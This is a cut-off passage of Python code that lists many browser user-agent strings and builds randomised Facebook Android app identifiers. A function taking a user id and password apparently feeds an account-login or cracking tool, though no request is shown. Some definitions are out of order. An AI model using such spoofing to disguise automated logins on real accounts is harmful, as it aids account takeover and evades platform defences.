vv="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14"
ww="Mozilla/5.0 (Linux; Android 6.0.1; SM-G920F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/109.0.0.15.71;]"
xx="Mozilla/5.0 (X11; U; Linux x86_64; pl-PL; rv:1.8) Gecko/20051128 SUSE/1.5-0.1 Firefox/1.5.0.1"
yy="Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0"
zz="Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 [FBAN/FBIOS;FBAV/59.0.0.51.142;FBBV/33266808;FBRV/0;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.2;FBSS/3;FBCR/Telkomsel;FBID/phone;FBLC/en_US;FBOP/5]"
ab="Mozilla/5.0 (Linux; Android 5; en-us; DROID4 4G Build/6.7.2-180_DR4-16_M2-37) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/149.0.4529.141 Mobile Safari/537.36"
vv="Mozilla/5.0 (Linux; Android {10}; SM-A305GN Build/PPR1.247706.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6265.94 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/337.1.0.11.118;]"
zxx=(ab,vv,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv,ww,xx,yy,zz)

#_____________+___________#
akx="Mozilla/5.0 (Linux; arm_64; Android 12; CPH2159) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.7.38.00 SA/3 Mobile Safari/537.36"
akx1="Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648"
akx2="Mozilla/5.0 (Linux; Android 8.1.0; ZB602KL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36"
akx3="Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648"
akx4="Mozilla/5.0 (Linux; Android 10; A7 Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648"
akx5="Mozilla/5.0 (Linux; Android 11; CPH2145) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36"
akx6="Mozilla/5.0 (Linux; Android 10; SM-G960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648"
akx7="Mozilla/5.0 (Linux; Android 13; SM-F700F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 Replaio/3.1.2"
akx8="Mozilla/5.0 (Linux; arm_64; Android 11; RMX3430) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaApp_Android/23.16.1 YaSearchBrowser/23.16.1 BroPP/1.0 SA/3 Mobile Safari/537.36"
akx9="Mozilla/5.0 (Linux; U; Android 13; ru-ru; Xiaomi 12 Lite Build/TKQ1.220807.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.24.1-gn"
akx0="Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/32.0.875.0 Safari/532.0.0"
akx10="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_7) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/29.0.847.0 Safari/531.0.0"
akx11="Mozilla/5.0 (Windows NT 5.2; WOW64; rv:8.4) Gecko/20100101 Firefox/8.4.2"
akx12="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/30.0.895.0 Safari/537.0.2"
akx13="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_1 rv:4.0; LT) AppleWebKit/533.0.2 (KHTML, like Gecko) Version/6.1.0 Safari/533.0.2"
akx14="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8.9; rv:10.8) Gecko/20100101 Firefox/10.8.8"
akx15="Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4 rv:4.0; AB) AppleWebKit/532.1.2 (KHTML, like Gecko) Version/5.1.1 Safari/532.1.2"
akx16="Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/24.0.891.0 Safari/532.0.1"
akx17="Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.3; Trident/5.1; .NET CLR 4.4.84894.6)"
akx18="Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/38.0.838.0 Safari/532.0.1"
akx19="Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Trident/7.0; .NET CLR 4.1.89512.2)"
akx20="Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/538.2.0 (KHTML, like Gecko) Chrome/26.0.849.0 Safari/538.2.0"
akx21="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0 rv:4.0; MG) AppleWebKit/536.1.0 (KHTML, like Gecko) Version/5.1.10 Safari/536.1.0"
akx22="Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/533.1.0 (KHTML, like Gecko) Chrome/13.0.850.0 Safari/533.1.0"
akx23="Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.2; Trident/3.1; .NET CLR 4.5.92358.2)"
akx24="Mozilla/5.0 (Windows NT 6.2; WOW64; rv:6.4) Gecko/20100101 Firefox/6.4.2"
akx25="Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:6.3) Gecko/20100101 Firefox/6.3.7"
akx26="Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.2; Trident/3.0; .NET CLR 1.2.74030.3)"
akx27="Mozilla/5.0 (Windows NT 5.2; rv:14.0) Gecko/20100101 Firefox/14.0.9"
akx28="Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/17.0.817.0 Safari/532.1.2"
akx29="Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/28.0.840.0 Safari/533.0.0"
akx30="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_6) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/38.0.862.0 Safari/536.1.2"
akx31="Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.2.0 (KHTML, like Gecko) Chrome/39.0.875.0 Safari/532.2.0"
akx32="Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/13.0.849.0 Safari/537.0.2"
akx33="Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_7 rv:6.0; JV) AppleWebKit/534.0.2 (KHTML, like Gecko) Version/4.0.10 Safari/534.0.2"
akx34="Opera/12.32 (Windows NT 5.1; U; CE Presto/2.9.167 Version/11.00)"
akx35="Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.0.1 (KHTML, like Gecko) Chrome/34.0.852.0 Safari/534.0.1"
akx36="Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_9 rv:2.0; SC) AppleWebKit/538.1.1 (KHTML, like Gecko) Version/6.0.2 Safari/538.1.1"
akx37="Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/537.1.0 (KHTML, like Gecko) Chrome/29.0.861.0 Safari/537.1.0"
akx38="Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.1; .NET CLR 3.7.27846.5)"
akx39="Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 5 Plus MIUI/V10.2.1.0.OEGMIXM)"
akx40="Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A600F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36"
akx41="Mozilla/5.0 (Linux; Android 9; Redmi Note 7S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36"
akx42="Mozilla/5.0 (Linux; Android 9; SM-A705GM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36"
akx43="Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/68.0.234683655 Mobile/14G60 Safari/602.1"
akx44="Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36"
akx45="Mozilla/5.0 (Linux; Android 5.1.1; SM-J105F Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 GSA/5.10.32.19.arm"
akx46="Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 5A MIUI/V10.3.2.0.OCKMIXM)"
akx47="Mozilla/5.0 (Linux; Android 6.0; SMART Surf2 4G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
akx48="Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J111F Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36"
akx49="Mozilla/5.0 (iPad; CPU OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) CriOS/71.0.3578.89 Mobile/14E304 Safari/602.1"
akx50="Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36"
akx51="Mozilla/5.0 (Linux; Android 4.1.2; C1905 Build/15.1.C.2.8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36"
akx52="Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; IEeleven; rv:11.0) like Gecko"
akx53="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36 OPR/62.0.3331.18"
akx54="Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36 GSA/10.28.9.21.arm64"
akx55="Mozilla/5.0 (Linux; Android 8.0.0; SM-G570F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36"
akx56="Mozilla/5.0 (Linux; Android 8.1.0; SM-J530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67 Mobile Safari/537.36"
akx57="AndroidDownloadManager/8.1.0 (Linux; U; Android 8.1.0; meizu X8 Build/OPM1.171019.026)"
akx58="Mozilla/5.0 (Linux; Android 9; POT-LX1 Build/HUAWEIPOT-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36"
akx59="Mozilla/5.0 (Linux; Android 9; LYA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36"
akx60="Mozilla/5.0 (Linux; Android 7.1.1; VFD 710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36"
akx61="Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36"
akx62="Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36"
akx63="AndroidDownloadManager/9 (Linux; U; Android 9; SM-A705FN Build/PPR1.180610.011)"
akx64="Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J415F Build/M1AJQ)"
akx65="Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG-SM-G935A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36"
akx66="Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36 GSA/10.20.3.21.arm"
akx67="AndroidDownloadManager/9 (Linux; U; Android 9; VTR-L09 Build/HUAWEIVTR-L09)"
akx68="Dalvik/2.1.0 (Linux; U; Android 9; VTR-L09 Build/HUAWEIVTR-L09)"
cxk=(akx,akx0,akx1,akx2,akx3,akx4,akx5,akx6,akx7,akx8,akx9,akx10,akx11,akx12,akx13,akx14,akx15,akx16,akx17,akx18,akx19,akx20,akx21,akx22,akx23,akx24,akx25,akx26,akx27,akx28,akx29,akx30,akx31,akx32,akx33,akx34,akx35,akx36,akx37,akx38,akx39,akx40,akx41,akx42,akx43,akx44,akx45,akx46,akx47,akx48,akx49,akx50,akx51,akx52,akx53,akx54,akx55,akx56,akx57,akx58,akx59,akx60,akx61,akx62,akx63,akx64,akx65,akx66,akx67,akx68)

#_______________##____________#
a="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
b="Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko"
c="Mozilla/5.0 (Linux; U; Android 4.4.2; id; SM-G900 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/9.9.2.467 U3/0.8.0 Mobile Safari/534.30"
d="Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko"
e="Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko"
f="Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.517"
g="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
h="Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
i="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
j="Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36"
k="Mozilla/5.0 (Linux; Android 6.0.1; SM-G928F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/109.0.0.15.71;]"
l="Mozilla/5.0 (Linux; Android 5.0.2; SM-G530FZ Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
m="Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
n="Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
o="Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:47.0) Gecko/20100101 Firefox/47.0"
p="Mozilla/5.0 (Windows NT 10.0; rv:51.0) Gecko/20100101 Firefox/51.0"
q="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0"
r="Mozilla/5.0 (compatible; PaperLiBot/2.1; http://support.paper.li/entries/20023257-what-is-paper-li)"
s="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7"
t="Mozilla/5.0 (X11; CrOS x86_64 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36"
u="Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0"
v="Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G36 Safari/601.1"
w="Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
x="Mozilla/5.0 (Linux; Android 6.0.1; SM-G930F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
y="Mozilla/5.0 (X11; CrOS armv7l 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36"
z="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
aa="Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
bb="Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko"
cc="Mozilla/5.0 (Linux; Android 5.0.2; SM-T530 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36"
dd="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.50"
ee="Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0E; InfoPath.1)"
ff="Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"
gg="Mozilla/5.0 (compatible; ecoresearch/0.9; +http://www.ecoresearch.net)"
hh="Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
ii="Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0"
jj="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
kk="Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
ll="Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0"
mm="Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 [FBAN/FBIOS;FBAV/78.0.0.40.70;FBBV/48784289;FBRV/0;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/10.2.1;FBSS/2;FBCR/OrangeFrance;FBID/phone;FBLC/fr_FR;FBOP/5]"
nn="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0"
oo="Mozilla/5.0 (X11; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0"
pp="Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
qq="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0"
rr="Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 Iceweasel/3.0.3 (Debian-3.0.3-3)"
ss="Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Firefox/38.0"
tt="Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0"
uu="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36"
vv="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14"
sd=(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv)
def swag():
	oppo = random.choice(["CNM632", "CPH1114", "CPH1235", "CPH1451", "CPH1615", "CPH1664", "CPH1869", "CPH1929", "CPH1985",
    "CPH2048", "CPH2107", "CPH2238", "CPH2261", "CPH2331", "CPH2332", "CPH2351", "CPH2389", "CPH2451",
    "CPH2491", "CPH2513", "CPH2515", "CPH2519", "CPH2521", "CPH2523", "CPH2525", "CPH2529", "CPH2551",
    "CPH2569", "CPH2579", "CPH2589", "CPH2591", "CPH2643", "CPH3475", "CPH3669", "CPH3682", "CPH3731",
    "CPH3776", "CPH3785", "CPH4125", "CPH4275", "CPH4299", "CPH4395", "CPH4473", "CPH4987", "CPH5286",
    "CPH5841", "CPH5947", "CPH6178", "CPH6244", "CPH6271", "CPH6316", "CPH6519", "CPH6528", "CPH6697",
    "CPH7338", "CPH7364", "CPH7382", "CPH7532", "CPH7577", "CPH7948", "CPH7991", "CPH8153", "CPH8346",
    "CPH8347", "CPH8363", "CPH8393", "CPH8467", "CPH8472", "CPH8534", "CPH8686", "CPH8893", "CPH9177",
    "CPH9226", "CPH9659", "CPH9667", "CPH9716", "CPH9763", "CPH9839", "CPH9929"])
	ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.48.'+'122;FBBV/'+str(random.randint(1111111,9999999))+';FBDM/{density=2'+'.0,width='+'720,height='+'1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/'+str(oppo)+';FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
	return ua
def yek():
    import random
    fbav = f'{random.randint(10,437)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
    fban = random.choice(["FB4A", "FB5A", "FB6A"])
    fbbv = str(random.randint(10000000, 99999999))
    sex = f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};"
    umah = '[FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1'
    xuna = sex+umah
    ex = random.choice([xuna])
    return ex
def api(self, uid, pwx):
		rua = random.choice([
			  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Telstra Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900I;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9506;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-I337M;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/movistar;FBMF/bq;FBBD/bq;FBPN/com.facebook.katana;FBDV/Aquaris E5 FHD;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/EMOVIL;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One;FBSV/4.4.3;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SGH-I537;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1920,height=1080};FBLC/el_GR;FBCR/VODAFONE GR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=4.0,width=1440,height=2392};FBLC/es_LA;FBCR/Movil GSM ;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D855;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=4.0,width=1440,height=2392};FBLC/es_LA;FBCR/Personal;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D855;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=4.0,width=1440,height=2560};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920I;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748067;FBDM/{density=1.0,width=1280,height=800};FBLC/de_DE;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-P5210;FBSV/4.4.2;nullFBCA/x86:armeabi-v7a;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748067;FBDM/{density=1.0,width=800,height=1280};FBLC/en_GB;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-P5210;FBSV/4.4.2;nullFBCA/x86:armeabi-v7a;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=786};FBLC/es_LA;FBCR/TELCEL;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H320;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
